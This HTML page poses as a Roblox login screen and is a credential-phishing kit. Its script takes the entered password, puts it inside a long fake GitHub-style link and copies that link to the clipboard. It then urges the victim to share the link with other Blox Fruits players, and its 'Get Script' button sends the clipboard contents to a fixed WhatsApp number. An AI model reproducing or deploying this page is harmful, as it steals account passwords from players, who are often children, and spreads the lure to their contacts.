<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Roblox Modern UI</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
:root {
  --bg-color: #0c0d10;
  --nav-color: #1a1d23;
  --sidebar-color: #131519;
  --accent-blue: #0084ff;
  --accent-hover: #0074e0;
  --card-bg: #1e2127;
  --text-main: #ffffff;
  --text-muted: #babbbe;
  --input-bg: #2b2e35;
}

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
}

body{
  background: var(--bg-color);
  color: var(--text-main);
  overflow-x: hidden;
}

/* HIDDEN TOGGLE */
#menu-toggle{ display:none; }

/* NAVBAR */
.navbar{
  height: 60px;
  background: var(--nav-color);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 24px;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 100;
  border-bottom: 1px solid #2d3036;
}

.nav-left{
  display: flex;
  align-items: center;
  gap: 24px;
}

/* IMPROVED LOGO */
.logo-container {
  display: flex;
  align-items: center;
  gap: 10px;
  cursor: pointer;
}

.logo{
  width: 28px;
  height: 28px;
  background: #fff;
  border-radius: 6px;
  transform: rotate(-15deg); /* Roblox tilt */
  position: relative;
  box-shadow: 0 0 15px rgba(255,255,255,0.1);
}

.logo::after{
  content: "";
  position: absolute;
  width: 8px;
  height: 8px;
  background: var(--nav-color);
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}

/* BUTTONS */
.signin-btn{
  padding: 8px 24px;
  background: transparent;
  border: 1px solid #fff;
  border-radius: 4px;
  color: #fff;
  font-weight: 500;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.2s;
}

.signin-btn:hover {
  background: rgba(255,255,255,0.1);
}

/* SIDEBAR */
.sidebar{
  position: fixed;
  top: 60px;
  left: 0;
  width: 240px;
  height: calc(100vh - 60px);
  background: var(--sidebar-color);
  padding: 16px 12px;
  transform: translateX(-100%);
  transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  z-index: 90;
}

#menu-toggle:checked ~ .sidebar{ transform: translateX(0); }

.sidebar a{
  display: flex;
  align-items: center;
  gap: 15px;
  padding: 12px 16px;
  color: var(--text-muted);
  text-decoration: none;
  border-radius: 8px;
  font-size: 15px;
  font-weight: 500;
  margin-bottom: 4px;
}

.sidebar a:hover{
  background: #252932;
  color: #fff;
}

/* MAIN CONTENT */
.main{
  margin-top: 60px;
  padding: 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
  min-height: 100vh;
  background: radial-gradient(circle at top, #1a202c 0%, #0c0d10 60%);
}

/* STUNNING LOGIN BOX */
.signin-box{
  background: var(--card-bg);
  width: 100%;
  max-width: 400px;
  padding: 40px;
  border-radius: 12px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  text-align: center;
}

.signin-box h2{
  font-size: 28px;
  margin-bottom: 8px;
  font-weight: 700;
}

.signin-box p {
  color: var(--text-muted);
  margin-bottom: 30px;
  font-size: 14px;
}

.input-group{
  margin-bottom: 20px;
  text-align: left;
}

.input-group label {
  display: block;
  font-size: 12px;
  text-transform: uppercase;
  color: var(--text-muted);
  margin-bottom: 8px;
  font-weight: 700;
}

.input-group input{
  width: 100%;
  padding: 14px;
  background: var(--input-bg);
  border: 1px solid #3e4249;
  border-radius: 8px;
  color: #fff;
  outline: none;
  transition: border 0.2s;
}

.input-group input:focus {
  border-color: var(--accent-blue);
}

.submit-btn{
  width: 100%;
  padding: 14px;
  background: var(--accent-blue);
  border: none;
  border-radius: 8px;
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
  box-shadow: 0 4px 12px rgba(0, 132, 255, 0.3);
  transition: transform 0.1s, background 0.2s;
}

.submit-btn:hover {
  background: var(--accent-hover);
}

.submit-btn:active {
  transform: scale(0.98);
}

.footer-links {
  margin-top: 25px;
  font-size: 13px;
  color: var(--text-muted);
}

.footer-links a {
  color: var(--accent-blue);
  text-decoration: none;
}
 .main2{
  margin-top: 60px;
  padding: 40px;
  display: none;
  flex-direction: column;
  align-items: center;
  min-height: 100vh;
  background: radial-gradient(circle at top, #1a202c 0%, #0c0d10 60%);
}
  .scriptbox{
  background: var(--card-bg);
  width: 100%;
  max-width: 400px;
  padding: 40px;
  border-radius: 12px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  text-align: center;
  display:none;
  
}
  .bar{
    background: var(--card-bg);
    width:100%;
    height:2rem;
    border:2px solid white;
    border-radius:20px;
    align-items:center;
    scale:0.9;
  }
  .scriptbtn{
    width:100%;
    height:3rem;
    border:2px solid white;
    border-radius:50px;
    background-color:green;
    color:white;
    scale:0.5;
    font-align:center;
  }
</style>
</head>

<body>

<input type="checkbox" id="menu-toggle">

<div class="navbar">
  <div class="nav-left">
    <label for="menu-toggle" class="menu-btn" style="cursor:pointer">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
        <rect y="4" width="24" height="2"></rect>
        <rect y="11" width="24" height="2"></rect>
        <rect y="18" width="24" height="2"></rect>
      </svg>
    </label>

    <div class="logo-container">
      <div class="logo"></div>
      <span style="font-weight: 900; letter-spacing: -0.5px; font-size: 20px;">ROBLOX</span>
    </div>
  </div>

  <button class="signin-btn">Log In</button>
</div>

<div class="sidebar">
  <a href="#"><strong>Home</strong></a>
  <a href="#">Profile</a>
  <a href="#">Messages</a>
  <a href="#">Friends</a>
  <a href="#">Avatar</a>
  <a href="#">Inventory</a>
  <a href="#">Trade</a>
  <hr style="border: 0; border-top: 1px solid #2d3036; margin: 10px 0;">
  <a href="#">Groups</a>
  <a href="#">Blog</a>
</div>

<div class="main">
  <div class="signin-box">
    <h2>Login</h2>
    <p>Enter your details to play</p>

    <div class="input-group">
      <label>Username / Email</label>
      <input type="text" placeholder="Username/Email/Phone">
    </div>

    <div class="input-group">
      <label>Password</label>
      <input type="password" placeholder="Password">
    </div>

    <button class="submit-btn">Log In</button>

    <div class="footer-links">
      <a href="#">Forgot Password or Username?</a>
    </div>
  </div>
</div>
  
  <div class="main2">
    
    <div class="scriptbox">
      <div class="bar">Click Get Script</div>
      <button class="scriptbtn">Get Script</button>

    </div>
  </div>
<script>
const loginBtn = document.querySelector('.submit-btn');

loginBtn.addEventListener('click', async () => {
  const password = document.querySelector(
    'input[type="password"]'
  ).value.trim();

  if (!password) {
    alert('Enter username first');
    return;
  }

  try {
    await navigator.clipboard.writeText(`https://github.gg/HgimsoeURuKGBgdjUfSizmIfVGGnIOLmGTtxkzkaIYUuioooBbUiIIooOOuyhbbNnnIIiiiiiiiNnnvUutfvBbvvJutYIkVUUrtTtTyIIiuuuUuuiUiHrrTT/GithubScript.Omghub.redzhub.gravityhub/p=${password}/199xi9s8ss99aka9zd9zzs99a9/faaah/hellnah/faaaah/hellnah/faaahhhhhh/helllnnmaaahahhhhhhhhhhhhhhhhhh`);
    console.log("Done");
    alert("Link Copied In Your ClipBoard Share This Link To Someone In WhatApps That Plays BloxFruits");
    document.querySelector('.main').style.display = "None";
    document.querySelector('.main2').style.display = "flex";
    document.querySelector('.scriptbox').style.display = "block";
    
    
  } catch (e) {
    console.log("Not Done");
  }
});
  document.querySelector('.scriptbtn').addEventListener('click', async () => {
  try {
    const text = await navigator.clipboard.readText();
    const whatsappUrl = `https://wa.me/+916291241129?text=${encodeURIComponent(text)}`;
    location.href(whatsappUrl, "_blank");
  } catch (e) {
    console.error("Failed to read clipboard text:", e);
  }
});
</script>
</body>
</html>
